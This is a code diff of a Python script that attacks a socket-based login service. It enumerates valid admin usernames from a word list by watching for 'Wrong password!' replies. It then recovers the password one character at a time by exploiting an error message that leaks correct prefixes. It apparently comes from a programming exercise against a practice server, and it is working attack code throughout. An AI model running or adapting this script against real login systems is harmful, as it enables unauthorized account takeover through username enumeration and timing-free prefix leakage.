@@ -1,32 +1,67 @@
 import socket
 import argparse
 import itertools
+import json
+from string import ascii_letters, digits
 
+CHARACTERS = ascii_letters + digits
 
-def bruteforce(client_socket):
-    passwords = load_passwords()
+def find_admin_login(client_socket):
+    logins = load_logins()
 
-    for password in passwords:
-        password_iter = map(''.join, itertools.product(*zip(password.lower(), password.upper())))
-        for pwd in password_iter:
-            client_socket.send(pwd.encode())
-            response = client_socket.recv(10240)
-            response = response.decode()
+    for login in logins:
+        data = {
+            "login": login,
+            "password": "123456"
+        }
 
-            if response == "Connection success!":
-                client_socket.close()
-                print(pwd)
-                return
+        client_socket.send(json.dumps(data).encode())
+        response = client_socket.recv(10240)
+        response = response.decode()
+        response_dict = json.loads(response)
+        if response_dict["result"] == "Wrong password!":
+            return login
+    return None
+
+def find_password(client_socket, login, current_pass = ""):
+    password_iter = itertools.product(CHARACTERS)
+    for pwd_tuple in password_iter:
+        password = current_pass + "".join(pwd_tuple)
+
+        data = {
+            "login": login,
+            "password": password
+        }
+        client_socket.send(json.dumps(data).encode())
+        response = client_socket.recv(10240)
+        response = response.decode()
+        response_dict = json.loads(response)
+
+        if response_dict["result"] == "Connection success!":
+            login_form = {"login": login, "password": password}
+            print(json.dumps(login_form))
+            client_socket.close()
+            return True
+        elif response_dict["result"] == "Exception happened during login":
+            current_pass = password
+            if find_password(client_socket, login, current_pass):
+                return True
+    return False
+
+def hack(client_socket):
+    login = find_admin_login(client_socket)
+    if login:
+        find_password(client_socket, login)
 
 def connection(hostname, port):
     with socket.socket() as client_socket:
         address = (hostname, port)
 
         client_socket.connect(address)
-        bruteforce(client_socket)
+        hack(client_socket)
 
-def load_passwords():
-    with open("passwords.txt", "r") as file:
+def load_logins():
+    with open("logins.txt", "r") as file:
         passwords = [line.strip() for line in file]
     return passwords
 
